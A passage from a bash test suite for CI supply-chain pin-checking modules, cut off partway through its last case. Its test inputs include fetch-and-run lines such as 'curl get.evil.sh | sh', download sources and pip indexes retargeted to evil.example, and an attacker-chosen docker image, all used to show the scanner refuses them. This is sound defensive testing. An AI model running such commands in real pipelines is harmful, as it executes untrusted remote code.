#!/usr/bin/env bash
# proves: REQ-SUP-001-AC18
# The pin helpers, proved offline. pin-age-check.py keeps the pin judge (is_pin, judge_item, parse_time), its tag and
# registry lookups and its ruled-text reader; pin-inventory.py reads every pin a pull request can move (action, tool,
# gotool, package and image items, "<kind>:<name>@<version>") and every form it cannot measure. Each case loads the
# module it tests and checks it directly, or checks a committed data file (the rulings, the base-inputs list) or the
# harness-assertion-line parser (harness_form.py, built here), none of it through a command line.
set -euo pipefail
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../../.." && pwd)
chk="$here/../supply-chain/pin-age-check.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
ok()  { pass=$((pass+1)); echo "ok   $1"; }
bad() { failn=$((failn+1)); echo "FAIL $1"; }
CASE=""
check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }

# --- the scan reads no time and asks no server: no live or fixture source is left in it
# ---------------------------------------------------
CASE="the scan defines none of the time-source names: live proof, observer, PR clock, registry and index times, \
fixture class, minimum age"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
for n in ("live_proofs", "observed", "_pr_clock", "_registry_push", "_go_index_time", "_release_time", "_commit_date",
          "Fixture", "Live", "MIN_DAYS", "SERVER_SIDE", "tobs", "GO_EXEMPT_REASON"):
    assert not hasattr(ac, n), n
PY
CASE="parse_time truncates a publication time's fraction like a clock (12:00:00.9 is 12:00:00, not 12:00:01), reads an offset, and gives None for a non-ISO string and a non-string"
check python3 - "$chk" <<'PY'
import datetime as dt, importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
U = dt.timezone.utc
assert ac.parse_time("2026-10-05T12:00:00.9Z") == dt.datetime(2026, 10, 5, 12, 0, 0, tzinfo=U), ac.parse_time("2026-10-05T12:00:00.9Z")
assert ac.parse_time("2026-10-05T12:00:00+01:00") == dt.datetime(2026, 10, 5, 11, 0, 0, tzinfo=U)
assert ac.parse_time("not a time") is None and ac.parse_time(5) is None and ac.parse_time(None) is None
PY
CASE="parse_time takes exactly one parameter (the hold-era clock flag is gone): a second argument is a TypeError"
check python3 - "$chk" <<'PY'
import importlib.util, inspect, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert len(inspect.signature(ac.parse_time).parameters) == 1
try:
    ac.parse_time("2026-10-05T12:00:00Z", True)
except TypeError:
    pass
else:
    raise SystemExit("a second argument was accepted")
PY

# --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
try:
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
except RuntimeError as e:
    assert "refusing to read it partially" in str(e)
else:
    raise AssertionError("an over-long command line was read as its prefix")
assert time.time() - t < 3, time.time() - t
PY
CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/install-scanner.sh": "SCOUT_VER=1.26.0\ncase x in docker-scout|docker-scout-1.25.0|docker-scout-1.24.0) ;; esac\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/latest/download/x.tgz\n          go run example.org/tool@v1.2.3\n          go get example.org/other@v2.0.0\n"})
for k in ("tool:scout@1.25.0", "tool:scout@1.24.0", "tool:scout@1.26.0", "tool:o/r@latest", "gotool:example.org/tool@v1.2.3", "gotool:example.org/other@v2.0.0"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: install forms it does not measure (npm, apt, gh release download, a pip URL, a non-release download) are LISTED"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
whats = {k[1] for k in inv.unmeasured(f)}
assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download"}, whats
PY

CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items; a range, \
(unpinned) or an expression is NEVER a pin the scan can read"
check python3 - "$here/../supply-chain/pin-inventory.py" "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          docker run --rm \"alpine:3.99\" true\n          docker run --cpus 2 --memory 1g busybox:1.36 true\n          pip install requests flask[async]\n"})
for k in ("image:alpine:3.99@", "image:busybox:1.36@", "package:pypi/requests@(unpinned)", "package:pypi/flask@(unpinned)"):
    assert k in got, (k, sorted(got))
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
for v in (">=2.0", "(unpinned)", "latest", "${{expression}}"):
    ok, why = ac.judge_item(inv.Item("package", "pypi/p", v))
    assert not ok and "not a pin" in why, (v, why)
# a tag-form ref is no pin where a commit is needed (an action), and a tag-only image has no digest
for v in ("v2", "2.17", "v2.17"):
    ok, why = ac.judge_item(inv.Item("action", "o/r", v))
    assert not ok and "not a pin" in why, (v, why)
for k in ("image:alpine:3.99@", "image:busybox:1.36@"):
    ok, why = ac.judge_item(got[k])
    assert not ok and "not a pin" in why, (k, why)
PY
CASE="inventory: a subdirectory taken from untrusted action metadata is redacted like every other part of a key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
PY

CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
check python3 - "$chk" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
calls = []
def run(cmd, **k):
    calls.append(cmd)
    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
    return subprocess.CompletedProcess(cmd, 0, out, "")
subprocess.run = run
assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
ac._TAGS.clear()
subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
try:
    ac._tags_for_commit("o/r", "c1")
except ac.CouldNotLook:
    pass
else:
    raise AssertionError("a failed ls-remote was read as no tags")
PY

CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, subprocess, sys, os
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
long_a = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o ok.sh"
long_b = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o evil.sh"
ka = inv.unmeasured({".github/workflows/a.yml": "x: " + long_a + "\n"}); kb = inv.unmeasured({".github/workflows/a.yml": "x: " + long_b + "\n"})
assert set(ka) != set(kb), "the key must differ when only the tail differs"
repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
PY

CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker run alpine:3.99 true\npip install evilpkg==1.0\ncurl -L https://github.com/evil/evil/releases/download/v1.0/x.tgz | tar xz\n",
                     "bin/install-scanner.sh": "NEWT_VERSION=9.9.9\nSCOUT_BASE=\"${SCOUT_BASE_URL:-https://github.com/docker/scout-cli/releases/download}\"\nTOOL_BASE_URL=https://evil.example/dl\n",
                     "tools/act/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: evil/act@v1\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: ./tools/act\n      - run: pip install -r deps.txt\n"})
for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil/x.tgz@v1.0", "tool:newt@9.9.9", "action:evil/act@v1"):
    assert k in got, (k, sorted(got))
assert any(k.startswith("action:local:./tools/act~") and k.endswith("@(local)") for k in got), sorted(got)   # a local action: its name carries a digest of the raw spelling
assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
PY

CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, os, subprocess, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
    try:
        fn()
    except RuntimeError as e:
        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
assert time.time() - t < 3, time.time() - t
# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
try:
    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
except RuntimeError:
    pass
else:
    raise AssertionError("an overlong pip install was accepted")
repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/big.sh", "w").write("# x\n" * 300000)
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
    try:
        fn()
    except RuntimeError as e:
        assert "too large" in str(e)
    else:
        raise AssertionError("an over-size script was read")
assert inv._strip_expressions("a ${{ x }} b ${{ y") == "a ${{expression}} b ${{expression}}"
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: echo ${{ " + "x" * 200 + " }}\n"}) == {}
PY

CASE="a version or image given by a SHELL VARIABLE is a placeholder item that cannot be proven (adding one is refused), and an unreadable file stops the unmeasured check with exit 2, never 'nothing found'"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/x.sh": "V=1.2.3\ncurl -L https://github.com/o/r/releases/download/v${V}/t.tgz | tar xz\ndocker run --rm ghcr.io/o/i:${TAG} true\ndocker run $IMG true\npip install foo==${V}\ngo install example.org/x@$V\n"})
need = ("tool:o/r/t.tgz@v${var}", "image:(variable)@", "package:pypi/foo@${var}", "gotool:example.org/x@${var}")
for k in need:
    assert k in got, (k, sorted(got))
import importlib.util as u
spec = u.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = u.module_from_spec(spec); spec.loader.exec_module(ac)
for k in need:
    ok, why = ac.judge_item(got[k])
    assert not ok and "not a pin" in why, (k, why)
PY

CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
for ln in lines:
    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
    items = inv.inventory(f); um = inv.unmeasured(f)
    assert items or um, ("silent: " + ln)
# a line the inventory MEASURES is not also an unmeasured form
f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
assert inv.inventory(f) and not inv.unmeasured(f)
PY

CASE="an unmeasured form on a line that ALSO holds a measured item is still found; a placeholder is identified by its step, so a second variable image is a NEW key and a changed step is a changed key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mixed = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: npm install evil-pkg && echo busybox@sha256:" + "a" * 64 + "\n"}
assert inv.unmeasured(mixed), "the npm install on a measured line was skipped"
base = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n"}
head = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n      - run: docker run --rm $ATTACKER_CHOSEN_IMAGE sh -c x\n"}
b, h = inv.inventory(base), inv.inventory(head)
assert [k for k in h if k not in b], "a second variable image must be a new key"
edited = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $OTHER_IMG make test\n"}
assert [k for k in inv.inventory(edited) if k not in b], "an edited placeholder step must be a new key"
PY

CASE="every curl/wget is refused unless it is a measured release download; pip install of a quoted name or a variable is a placeholder; any requirements line that is not name==ver is refused; an installer-shaped input of ANY pinned action is a placeholder"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, re, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
for ln in ('curl -fsSL "$URL" | sh', 'wget "$TOOL_URL"', 'curl get.evil.sh | sh', 'curl -fsSL evil.zip -o x', 'curl "${{ vars.X }}"'):
    assert inv.unmeasured(wf(ln)), ("not refused: " + ln)
assert not inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/v1.0/x.tgz -o x.tgz")), "a measured release download is not an unmeasured form"
for ln in ('pip install "evilpkg"', "pip install $DEPS", 'pip install "${{ vars.PKG }}"'):
    got = inv.inventory(wf(ln))
    assert any(re.search(r"^package:pypi/(\(variable\)|evilpkg)@\(unpinned\)", k) for k in got), (ln, sorted(got))
base = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\n"})
head = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\nevilpkg @ https://evil.example/x.whl --hash=sha256:cc\nleftpad>=1\n--extra-index-url https://evil.example/simple\nbare\n"})
new = [k for k in head if k not in base]
assert len(new) == 4 and all("(unmeasured:" in k for k in new), new
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: aquasecurity/setup-trivy@" + "a" * 40 + " # v0.2.0\n        with:\n          version: v0.75.0-brand-new\n"}
assert any(k.startswith("tool:aquasecurity/setup-trivy:version@(input)") for k in inv.inventory(uses)), sorted(inv.inventory(uses))
assert not any("(input)" in k for k in inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-go@" + "a" * 40 + " # v6\n        with:\n          go-version: '1.27'\n"}))
PY

CASE="a script's placeholder is identified by its own LINE: an edit elsewhere in the script moves nothing, an edit of that line does"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
base = "echo a\ndocker run --rm $IMG make\necho b\n"
a = set(inv.inventory({"bin/x.sh": base}))
assert a and a == set(inv.inventory({"bin/x.sh": base + "echo more\n"})) == set(inv.inventory({"bin/x.sh": "echo zero\n" + base}))
assert a != set(inv.inventory({"bin/x.sh": base.replace("$IMG", "$OTHER")}))
PY

CASE="round 15: a download keeps its EXACT tag, pip options may precede install and --requirement is a requirements file, *-version-file inputs are placeholders, a placeholder's identity covers the step's and the job's env, the real scanner download syntax is read and the rest of that script is scanned"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run, extra="": {".github/workflows/a.yml": "jobs:\n  j:\n" + extra + "    steps:\n      - run: " + run + "\n"}
g = inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x.tgz"))
it = [v for v in g.values() if v.name == "o/r"][0]
assert (it.version, it.label) == ("v1.2.3", "v1.2.3")
assert inv.inventory(wf("python3 -m pip --disable-pip-version-check install evilpkg==9.9.9")).get("package:pypi/evilpkg@9.9.9")
assert inv.unmeasured(wf("pip install --requirement deps.txt")) and not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: .python-version\n"}
assert any("python-version-file@(input)" in k for k in inv.inventory(uses)), sorted(inv.inventory(uses))
a = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: alpine@sha256:" + "a" * 64 + "\n        run: docker run --rm \"$IMAGE\" true\n"})
b = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: evil/image:latest\n        run: docker run --rm \"$IMAGE\" true\n"})
assert [k for k in b if k not in a and "(variable)" in k], "changing the variable's value (env) must change the placeholder's key"
c = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: alpine@sha256:" + "a" * 64 + "\n"))
d = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: evil/x:latest\n"))
assert set(c) != set(d), "a job-level env value changes the identity too"
real = inv.inventory({"bin/install-scanner.sh": 'TRIVY_BASE="${TRIVY_BASE_URL:-https://github.com/aquasecurity/trivy/releases/download}"\ncurl -fsSL https://github.com/evil/evil/releases/download/v1/x.tgz -o x\n'})
assert any(k.startswith("tool:source:") and "aquasecurity/trivy" in k for k in real) and any(v.name == "evil/evil" for v in real.values()), sorted(real)
PY

CASE="round 15 (plain forms): an expression-valued installer input, a container or services image given by an expression, and a matrix or env value feeding them are step-identified placeholders (a change to the value is a changed key); each curl/wget invocation is judged on its own"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def wfi(env, ver="${{ env.LINT_V }}"):
    return {".github/workflows/a.yml": "env:\n  LINT_V: " + env + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + ver + "\n"}
a, b = set(inv.inventory(wfi("v1.61.0"))), set(inv.inventory(wfi("v9.9.9")))
assert a != b and any("golangci-lint@${{expression}}" in k for k in a), (a, b)
def wfm(m):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        py: " + m + "\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version: ${{ matrix.py }}\n"}
assert set(inv.inventory(wfm("['3.12']"))) != set(inv.inventory(wfm("['3.12', '3.13-dev']")))
def wfc(m, svc="postgres:${{ matrix.pg }}"):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        image: " + m + "\n    container: ${{ matrix.image }}\n    services:\n      db:\n        image: " + svc + "\n    steps:\n      - run: echo hi\n"}
c1 = inv.inventory(wfc("['node:20']"))
assert any(k.startswith("image:(expression)@") for k in c1) and len([k for k in c1 if k.startswith("image:(expression)")]) == 2, sorted(c1)
assert set(c1) != set(inv.inventory(wfc("['node:20', 'evil:latest']")))
um = inv.unmeasured({".github/workflows/a.yml": "x: wget https://example.com/a.tgz; curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
assert [k for k in um if k[1] == "a download"], "the non-release wget before a release curl must still be refused"
assert not inv.unmeasured({".github/workflows/a.yml": "x: curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
PY

CASE="round 15 (Codex): the exact download tag is the identity (v1.2.3 and 1.2.3 differ), an encoded-tag URL is \
refused not excused, requirements.in/-dev/.lock files are refused, an unversioned go install is a placeholder, an \
unresolved package NAME cannot pass the pin judge, installer-input placeholders carry their step identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import datetime, importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
k1 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x")))
k2 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/1.2.3/x.tgz -o x")))
assert k1 != k2
assert inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/release%2F1.2.3/x.tgz -o x")), "an encoded-tag URL must be refused"
for ln in ("pip install -r requirements.in", "pip install -r requirements-dev", "pip install --requirement requirements.lock"):
    assert inv.unmeasured(wf(ln)), ln
assert not inv.unmeasured(wf("pip install -r requirements.txt")) and not inv.unmeasured(wf("pip install -r .github/pins/adjudicator-requirements.txt"))
assert [k for k in inv.inventory(wf("go install -mod=mod github.com/securego/gosec/v2/cmd/gosec")) if "(unversioned)" in k]
it = [v for v in inv.inventory(wf('go install "$TOOL@v1.2.3"')).values() if v.kind == "gotool"][0]
ok, why = ac.judge_item(it)
assert not ok and "not a pin" in why, why
u = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: " + v + "\n"}
assert set(inv.inventory(u(".python-version"))) != set(inv.inventory(u(".python-version-new")))
PY

CASE="AC34: a quoted go install argument (single, double, backslash) is read after quote removal: the same gotool item (name example.com/x, its version) as the unquoted one"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
sh = lambda ln: {"bin/t.sh": "#!/usr/bin/env bash\n" + ln + "\n"}
def read(files):
    return sorted((v.name, v.version) for v in inv.inventory(files).values() if v.kind == "gotool")
for mk in (wf, sh):
    for ver, forms in (("latest", ["'example.com/x@latest'", '"example.com/x@latest"']), (">=1.0.0", ["'example.com/x@>=1.0.0'", '"example.com/x@>=1.0.0"']),
                       ("v1.2.3", ["'example.com/x@v1.2.3'", '"example.com/x@v1.2.3"', "example.com/x@v1.2.\\3", "'example.com/x@'v1.2.3"])):
        want = [("example.com/x", ver)]
        for f in forms:
            assert read(mk("go install " + f)) == want, (f, read(mk("go install " + f)))
PY

CASE="a download SOURCE is an item: url=/URL=/*_BASE_URL assignments in a script and *_BASE_URL/*_URL env at any level; retargeting one (an env override, a url template line) is a changed key and is refused"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
sh = lambda ln: {"bin/install-scanner.sh": "TRIVY_VER=0.74.0\n" + ln + "\ncurl -fsSL \"$url\" -o t\n"}
a = set(inv.inventory(sh('url="${TRIVY_BASE}/v${TRIVY_VER}/trivy.tgz"'))); b = set(inv.inventory(sh('url="https://evil.example/t.tgz"')))
assert a != b and [k for k in b if k not in a and "(source)" in k], (a, b)
envwf = lambda v: {".github/workflows/a.yml": "env:\n  TRIVY_BASE_URL: " + v + "\njobs:\n  j:\n    steps:\n      - run: bin/install-scanner.sh trivy\n"}
assert set(inv.inventory(envwf("https://github.com/aquasecurity/trivy/releases/download"))) != set(inv.inventory(envwf("https://evil.example/dl")))
assert [k for k in inv.inventory(envwf("https://x")) if k.startswith("tool:source:env:trivy_base_url=")]
PY

CASE="round 16 (Codex): go install of a variable and pip3.12 install are placeholders/items; a script placeholder's identity includes the assignments of the variables it references; every URL of a downloader segment is classified by host and path; the downloaded asset name is part of the identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
assert [k for k in inv.inventory(wf('go install "$TOOL"')) if "(variable)" in k]
assert inv.inventory(wf("pip3.12 install examplepkg==99.0.0")).get("package:pypi/examplepkg@99.0.0")
a = set(inv.inventory({"bin/x.sh": "TAG=v1.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"})); b = set(inv.inventory({"bin/x.sh": "TAG=v9.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"}))
assert a != b
